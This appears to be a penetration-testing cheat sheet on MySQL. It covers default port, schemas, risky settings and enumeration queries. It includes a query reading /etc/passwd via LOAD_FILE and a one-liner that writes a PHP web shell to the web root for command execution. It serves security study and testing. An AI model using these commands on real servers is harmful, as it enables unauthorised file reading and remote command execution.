+++
title = "MySQL"
+++

- `TCP 3306`: normal
- Server Config:
    - `/etc/mysql/mysql.conf.d/mysqld.cnf`
- default system schemas/databases:
    - `mysql` - is the system database that contains tables that store information required by the MySQL server
    - `information_schema` - provides access to database metadata
    - `performance_schema` - is a feature for monitoring MySQL Server execution at a low level
    - `sys` - a set of objects that helps DBAs and developers interpret data collected by the Performance Schema
- `secure_file_priv` may be set as follows:
    - If empty, the variable has no effect, which is not a secure setting.
    - If set to the name of a directory, the server limits import and export operations to work only with files in that directory. The directory must exist; the server does not create it.
    - If set to NULL, the server disables import and export operations
- https://dev.mysql.com/doc/refman/8.0/en/system-schema.html#:~:text=The%20mysql%20schema%20is%20the,used%20for%20other%20operational%20purposes


{{% details "Dangerous Settings" %}}
- https://dev.mysql.com/doc/refman/8.0/en/server-system-variables.html

| **Settings**       | **Description**                                                                                              |
| ------------------ | ------------------------------------------------------------------------------------------------------------ |
| `user`             | Sets which user the MySQL service will run as.                                                               |
| `password`         | Sets the password for the MySQL user.                                                                        |
| `admin_address`    | The IP address on which to listen for TCP/IP connections on the administrative network interface.            |
| `debug`            | This variable indicates the current debugging settings                                                       |
| `sql_warnings`     | This variable controls whether single-row INSERT statements produce an information string if warnings occur. |
| `secure_file_priv` | This variable is used to limit the effect of data import and export operations.                              |
{{% /details %}}

```bash
# Login
# - try "root"
mysql -u <USER> -h <TARGET>
mysql -u <USER> --password=<PASSWORD> -P <PORT> -h <TARGET>

select version() ;
show databases ;
use <DATABASE> ;
show tables ;
show columns from <TABLE> ;

SELECT * FROM users ;
select * from <TABLE> ;
select * from <TABLE> where <COLUMN> = "<VALUE>" ;

use sys ;  # tables and metadata
select host, unique_users from host_summary ;

use information_schema ;  # metadata

### Read Files
# NOTE: not normal
select LOAD_FILE("/etc/passwd");

### Write Files (to achieve command execution)
show variables like "secure_file_priv";
SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
```
